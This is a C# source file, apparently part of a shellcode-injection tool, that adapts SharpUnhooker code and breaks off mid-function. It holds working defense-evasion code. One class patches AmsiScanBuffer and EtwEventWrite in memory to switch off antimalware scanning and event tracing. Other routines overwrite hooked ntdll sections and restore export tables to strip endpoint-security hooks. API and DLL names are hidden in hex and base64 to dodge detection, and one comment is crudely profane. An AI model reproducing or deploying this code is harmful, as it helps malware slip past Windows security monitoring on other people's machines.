using RemoteShellCodeInjection.Utils;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class PEReader
{
    //totally stolen from https://github.com/GetRektBoy724/SharpUnhooker added VERY VERY few adjs to my needs.
    public struct IMAGE_DOS_HEADER
    {      // DOS .EXE header
        public ushort e_magic;              // Magic number
        public ushort e_cblp;               // Bytes on last page of file
        public ushort e_cp;                 // Pages in file
        public ushort e_crlc;               // Relocations
        public ushort e_cparhdr;            // Size of header in paragraphs
        public ushort e_minalloc;           // Minimum extra paragraphs needed
        public ushort e_maxalloc;           // Maximum extra paragraphs needed
        public ushort e_ss;                 // Initial (relative) SS value
        public ushort e_sp;                 // Initial SP value
        public ushort e_csum;               // Checksum
        public ushort e_ip;                 // Initial IP value
        public ushort e_cs;                 // Initial (relative) CS value
        public ushort e_lfarlc;             // File address of relocation table
        public ushort e_ovno;               // Overlay number
        public ushort e_res_0;              // Reserved words
        public ushort e_res_1;              // Reserved words
        public ushort e_res_2;              // Reserved words
        public ushort e_res_3;              // Reserved words
        public ushort e_oemid;              // OEM identifier (for e_oeminfo)
        public ushort e_oeminfo;            // OEM information; e_oemid specific
        public ushort e_res2_0;             // Reserved words
        public ushort e_res2_1;             // Reserved words
        public ushort e_res2_2;             // Reserved words
        public ushort e_res2_3;             // Reserved words
        public ushort e_res2_4;             // Reserved words
        public ushort e_res2_5;             // Reserved words
        public ushort e_res2_6;             // Reserved words
        public ushort e_res2_7;             // Reserved words
        public ushort e_res2_8;             // Reserved words
        public ushort e_res2_9;             // Reserved words
        public uint e_lfanew;             // File address of new exe header
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DATA_DIRECTORY
    {
        public uint VirtualAddress;
        public uint Size;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER32
    {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public uint BaseOfData;
        public uint ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public uint SizeOfStackReserve;
        public uint SizeOfStackCommit;
        public uint SizeOfHeapReserve;
        public uint SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER64
    {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public ulong ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public ulong SizeOfStackReserve;
        public ulong SizeOfStackCommit;
        public ulong SizeOfHeapReserve;
        public ulong SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_FILE_HEADER
    {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct IMAGE_SECTION_HEADER
    {
        [FieldOffset(0)]
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public char[] Name;
        [FieldOffset(8)]
        public uint VirtualSize;
        [FieldOffset(12)]
        public uint VirtualAddress;
        [FieldOffset(16)]
        public uint SizeOfRawData;
        [FieldOffset(20)]
        public uint PointerToRawData;
        [FieldOffset(24)]
        public uint PointerToRelocations;
        [FieldOffset(28)]
        public uint PointerToLinenumbers;
        [FieldOffset(32)]
        public ushort NumberOfRelocations;
        [FieldOffset(34)]
        public ushort NumberOfLinenumbers;
        [FieldOffset(36)]
        public DataSectionFlags Characteristics;

        public string Section
        {
            get
            {
                int i = Name.Length - 1;
                while (Name[i] == 0)
                {
                    --i;
                }
                char[] NameCleaned = new char[i + 1];
                Array.Copy(Name, NameCleaned, i + 1);
                return new string(NameCleaned);
            }
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_BASE_RELOCATION
    {
        public uint VirtualAdress;
        public uint SizeOfBlock;
    }

    [Flags]
    public enum DataSectionFlags : uint
    {
        Stub = 0x00000000,
    }


    /// The DOS header
    private IMAGE_DOS_HEADER dosHeader;
    /// The file header
    private IMAGE_FILE_HEADER fileHeader;
    /// Optional 32 bit file header 
    private IMAGE_OPTIONAL_HEADER32 optionalHeader32;
    /// Optional 64 bit file header 
    private IMAGE_OPTIONAL_HEADER64 optionalHeader64;
    /// Image Section headers. Number of sections is in the file header.
    private readonly IMAGE_SECTION_HEADER[] imageSectionHeaders;
    private readonly byte[] rawbytes;

    public PEReader(string filePath)
    {
        // Read in the DLL or EXE and get the timestamp
        using (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
        {
            BinaryReader reader = new BinaryReader(stream);
            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

            // Add 4 bytes to the offset
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

            uint ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (Is32BitHeader)
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }

            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }

            rawbytes = File.ReadAllBytes(filePath);

        }
    }
    public PEReader(byte[] fileBytes)
    {
        // Read in the DLL or EXE and get the timestamp
        using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
        {
            BinaryReader reader = new BinaryReader(stream);
            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

            // Add 4 bytes to the offset
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

            uint ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (Is32BitHeader)
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }

            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }

            rawbytes = fileBytes;

        }
    }
    public static T FromBinaryReader<T>(BinaryReader reader)
    {
        // Read in a byte array
        byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

        // Pin the managed memory while, copy it out the data, then unpin it
        GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
        T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
        handle.Free();

        return theStructure;
    }
    public bool Is32BitHeader
    {
        get
        {
            ushort IMAGE_FILE_32BIT_MACHINE = 0x0100;
            return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
        }
    }
    public IMAGE_FILE_HEADER FileHeader => fileHeader;

    /// Gets the optional header
    public IMAGE_OPTIONAL_HEADER32 OptionalHeader32 => optionalHeader32;
    /// Gets the optional header
    public IMAGE_OPTIONAL_HEADER64 OptionalHeader64 => optionalHeader64;
    public IMAGE_SECTION_HEADER[] ImageSectionHeaders => imageSectionHeaders;
    public byte[] RawBytes => rawbytes;
}

public class Dynavoke
{
    // Delegate NtProtectVirtualMemory
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtProtectVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref IntPtr RegionSize,
        uint NewProtect,
        ref uint OldProtect);

    public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
    {
        IntPtr FunctionPtr = IntPtr.Zero;
        try
        {
            // Traverse the PE header in memory
            int PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            short OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            long OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            short Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            long pExport = 0;
            if (Magic == 0x010b)
            {
                pExport = OptHeader + 0x60;
            }
            else
            {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            int ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            int OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            int NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            int NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            int FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            int NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            int OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // Loop the array of export name RVA's
            for (int i = 0; i < NumberOfNames; i++)
            {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() +
                    Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                {
                    int FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    int FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((long)ModuleBase + FunctionRVA);
                    break;
                }
            }
        }
        catch
        {
            // Catch parser failure
            throw new InvalidOperationException("Failed to parse module exports.");
        }

        // will return IntPtr.Zero if not found!
        return FunctionPtr;
    }

    public static bool NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect)
    {
        // Craft an array for the arguments
        OldProtect = 0;
        object[] funcargs = { ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect };

        // get NtProtectVirtualMemory's pointer
        IntPtr NTDLLHandleInMemory = Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => Utils.FromHexString("6e74646c6c2e646c6c").Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress;
        IntPtr pNTPVM = GetExportAddress(NTDLLHandleInMemory, Utils.FromHexString("4e7450726f746563745669727475616c4d656d6f7279"));
        // dynamicly invoke NtProtectVirtualMemory
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(pNTPVM, typeof(NtProtectVirtualMemoryDelegate));
        uint NTSTATUSResult = (uint)funcDelegate.DynamicInvoke(funcargs);

        if (NTSTATUSResult != 0x00000000)
        {
            return false;
        }
        OldProtect = (uint)funcargs[4];
        return true;
    }
}

public class PatchAMSIAndETW
{
    // Thx D/Invoke!
    private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
    {
        IntPtr FunctionPtr = IntPtr.Zero;
        try
        {
            // Traverse the PE header in memory
            int PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            short OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            long OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            short Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            long pExport = 0;
            if (Magic == 0x010b)
            {
                pExport = OptHeader + 0x60;
            }
            else
            {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            int ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            int OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            int NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            int NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            int FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            int NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            int OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // Loop the array of export name RVA's
            for (int i = 0; i < NumberOfNames; i++)
            {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                {
                    int FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    int FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((long)ModuleBase + FunctionRVA);
                    break;
                }
            }
        }
        catch
        {
            // Catch parser failure
            throw new InvalidOperationException("Failed to parse module exports.");
        }

        // will return IntPtr.Zero if not found!
        return FunctionPtr;
    }

    private static void PatchETW()
    {
        try
        {
            IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
            IntPtr libPtr = Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => Utils.FromHexString("6e74646c6c2e646c6c").Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress;
            byte[] patchbyte = new byte[0];
            if (IntPtr.Size == 4)
            {
                string patchbytestring2 = "33,c0,c2,14,00";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++)
                {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            }
            else
            {
                string patchbytestring2 = "48,33,C0,C3";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++)
                {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            }
            IntPtr funcPtr = GetExportAddress(libPtr, Utils.FromHexString("4574774576656e745772697465"));
            IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
            uint oldProtect = 0;
            Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
            Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
            uint newProtect = 0;
            Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
            Console.WriteLine(Encoding.ASCII.GetString(Convert.FromBase64String("WysrK10gRVRXIFNVQ0NFU1NGVUxMWSBQQVRDSEVEIQ==")));
        }
        catch (Exception e)
        {
            Console.WriteLine("[-] {0}", e.Message);
            Console.WriteLine("[-] {0}", e.InnerException);
        }
    }

    private static void PatchAMSI()
    {
        try
        {
            IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
            byte[] patchbyte = new byte[0];
            if (IntPtr.Size == 4)
            {
                string patchbytestring2 = "B8,57,00,07,80,C2,18,00";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++)
                {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            }
            else
            {
                string patchbytestring2 = "B8,57,00,07,80,C3";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++)
                {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            }
            IntPtr libPtr = IntPtr.Zero;
            ProcessModule? m = Process.GetCurrentProcess().Modules
                                        .Cast<ProcessModule>()
.FirstOrDefault(x => Encoding.ASCII.GetString(Convert.FromBase64String(Utils.FromHexString("5957317a6153356b6247773d"))).Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase));
            if (m != null)
            {
                libPtr = m.BaseAddress;
            }
            if (libPtr != IntPtr.Zero)
            {
                IntPtr funcPtr = GetExportAddress(libPtr, Utils.FromHexString("416d73695363616e427566666572"));
                IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
                uint oldProtect = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
                Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
                uint newProtect = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
                Console.WriteLine(Encoding.ASCII.GetString(Convert.FromBase64String("WysrK10gQU1TSSBTVUNDRVNTRlVMTFkgUEFUQ0hFRCE=")));
            }
            else
            {
                Console.WriteLine(Encoding.ASCII.GetString(Convert.FromBase64String("Wy1dIEFNU0kuRExMIElTIE5PVCBERVRFQ1RFRCE=")));
            }
        }
        catch (Exception e)
        {
            Console.WriteLine("[-] {0}", e.Message);
            Console.WriteLine("[-] {0}", e.InnerException);
        }
    }

    public static void Run()
    {
        PatchAMSI();
        PatchETW();
    }
}

public class SharpUnhooker
{

    public static string[] BlacklistedFunction = { "NtQueueApcThread", "EnterCriticalSection", "LeaveCriticalSection", "DeleteCriticalSection", "InitializeSListHead", "HeapAlloc", "HeapReAlloc", "HeapSize" };

    public static bool IsBlacklistedFunction(string FuncName)
    {
        for (int i = 0; i < BlacklistedFunction.Length; i++)
        {
            if (string.Equals(FuncName, BlacklistedFunction[i], StringComparison.OrdinalIgnoreCase))
            {
                return true;
            }
        }
        return false;
    }

    public static void Copy(ref byte[] source, int sourceStartIndex, ref byte[] destination, int destinationStartIndex, int length)
    {
        if (source == null || source.Length == 0 || destination == null || destination.Length == 0 || length == 0)
        {
            throw new ArgumentNullException("Exception : One or more of the arguments are zero/null!");
        }
        if (length > destination.Length)
        {
            throw new ArgumentOutOfRangeException("Exception : length exceeds the size of source bytes!");
        }
        if ((sourceStartIndex + length) > source.Length)
        {
            throw new ArgumentOutOfRangeException("Exception : sourceStartIndex and length exceeds the size of source bytes!");
        }
        if ((destinationStartIndex + length) > destination.Length)
        {
            throw new ArgumentOutOfRangeException("Exception : destinationStartIndex and length exceeds the size of destination bytes!");
        }
        int targetIndex = destinationStartIndex;
        for (int sourceIndex = sourceStartIndex; sourceIndex < (sourceStartIndex + length); sourceIndex++)
        {
            destination[targetIndex] = source[sourceIndex];
            targetIndex++;
        }
    }

    public static bool JMPUnhooker(string DLLname)
    {
        // get the file path of the module
        string ModuleFullPath = string.Empty;
        try { ModuleFullPath = Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName; } catch { ModuleFullPath = null; }
        if (ModuleFullPath == null)
        {
            Console.WriteLine("[*] Module is not loaded,Skipping...");
            return true;
        }

        // read and parse the module, and then get the .TEXT section header
        byte[] ModuleBytes = File.ReadAllBytes(ModuleFullPath);
        PEReader OriginalModule = new PEReader(ModuleBytes);
        int TextSectionNumber = 0;
        for (int i = 0; i < OriginalModule.FileHeader.NumberOfSections; i++)
        {
            if (string.Equals(OriginalModule.ImageSectionHeaders[i].Section, ".text", StringComparison.OrdinalIgnoreCase))
            {
                TextSectionNumber = i;
                break;
            }
        }

        // copy the original .TEXT section
        IntPtr TextSectionSize = new IntPtr(OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualSize);
        byte[] OriginalTextSectionBytes = new byte[(int)TextSectionSize];
        Copy(ref ModuleBytes, (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].PointerToRawData, ref OriginalTextSectionBytes, 0, (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualSize);

        // get the module base address and the .TEXT section address
        IntPtr ModuleBaseAddress = Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress;
        IntPtr ModuleTextSectionAddress = ModuleBaseAddress + (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualAddress;

        // change memory protection to RWX
        uint oldProtect = 0;
        bool updateMemoryProtection = Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref ModuleTextSectionAddress, ref TextSectionSize, 0x40, ref oldProtect);
        if (!updateMemoryProtection)
        {
            Console.WriteLine("[-] Failed to change memory protection to RWX!");
            return false;
        }
        // apply the patch (the original .TEXT section)
        bool PatchApplied = true;
        try { Marshal.Copy(OriginalTextSectionBytes, 0, ModuleTextSectionAddress, OriginalTextSectionBytes.Length); } catch { PatchApplied = false; }
        if (!PatchApplied)
        {
            Console.WriteLine("[-] Failed to replace the .text section of the module!");
            return false;
        }
        // revert the memory protection
        uint newProtect = 0;
        Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref ModuleTextSectionAddress, ref TextSectionSize, oldProtect, ref newProtect);
        // done!
        Console.WriteLine("[-] {0} is unhooked.", DLLname.ToUpper());
        return true;
    }

    public static void EATUnhooker(string ModuleName)
    {
        IntPtr ModuleBase = IntPtr.Zero;
        try { ModuleBase = Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress; } catch { }
        if (ModuleBase == IntPtr.Zero)
        {
            Console.WriteLine("[-] Module is not loaded,Skipping...");
            return;
        }
        string ModuleFileName = Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName;
        byte[] ModuleRawByte = File.ReadAllBytes(ModuleFileName);

        // Traverse the PE header in memory
        int PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
        short OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
        long OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
        short Magic = Marshal.ReadInt16((IntPtr)OptHeader);
        long pExport = 0;
        if (Magic == 0x010b)
        {
            pExport = OptHeader + 0x60;
        }
        else
        {
            pExport = OptHeader + 0x70;
        }

        // prepare module clone
        PEReader DiskModuleParsed = new PEReader(ModuleRawByte);
        int RegionSize = DiskModuleParsed.Is32BitHeader ? (int)DiskModuleParsed.OptionalHeader32.SizeOfImage : (int)DiskModuleParsed.OptionalHeader64.SizeOfImage;
        int SizeOfHeaders = DiskModuleParsed.Is32BitHeader ? (int)DiskModuleParsed.OptionalHeader32.SizeOfHeaders : (int)DiskModuleParsed.OptionalHeader64.SizeOfHeaders;
        IntPtr OriginalModuleBase = Marshal.AllocHGlobal(RegionSize);
        Marshal.Copy(ModuleRawByte, 0, OriginalModuleBase, SizeOfHeaders);
        for (int i = 0; i < DiskModuleParsed.FileHeader.NumberOfSections; i++)
        {
            IntPtr pVASectionBase = (IntPtr)((ulong)OriginalModuleBase + DiskModuleParsed.ImageSectionHeaders[i].VirtualAddress);
            Marshal.Copy(ModuleRawByte, (int)DiskModuleParsed.ImageSectionHeaders[i].PointerToRawData, pVASectionBase, (int)DiskModuleParsed.ImageSectionHeaders[i].SizeOfRawData);
        }

        // Read -> IMAGE_EXPORT_DIRECTORY
        int ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
        if (ExportRVA == 0)
        {
            Console.WriteLine("[-] Module doesnt have any exports, skipping...");
            return;
        }
        int OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
        int NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
        int NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
        int FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
        int NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
        int OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
        int FunctionsRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + ExportRVA + 0x1C));

        // eat my cock u fokin user32.dll
        IntPtr TargetPtr = ModuleBase + FunctionsRVA;
        IntPtr TargetSize = (IntPtr)(4 * NumberOfFunctions);
        uint oldProtect = 0;
        if (!Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref TargetPtr, ref TargetSize, 0x04, ref oldProtect))
        {
            Console.WriteLine("[-] Failed to change EAT's memory protection to RW!");
            return;
        }

        // Loop the array of export RVA's
        for (int i = 0; i < NumberOfFunctions; i++)
        {
            string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
            int FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
            int FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
            int FunctionRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + FunctionsRVAOriginal + (4 * (FunctionOrdinal - OrdinalBase))));
            if (FunctionRVA != FunctionRVAOriginal)
            {
                try { Marshal.WriteInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))), FunctionRVAOriginal); }
                catch
                {
                    Console.WriteLine("[-] Failed to rewrite the EAT of {0} with RVA of {1} and function ordinal of {2}", FunctionName, FunctionRVA.ToString("X4"), FunctionOrdinal);
                    continue;
                }
            }
        }

        Marshal.FreeHGlobal(OriginalModuleBase);
        uint newProtect = 0;
        Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref TargetPtr, ref TargetSize, oldProtect, ref newProtect);
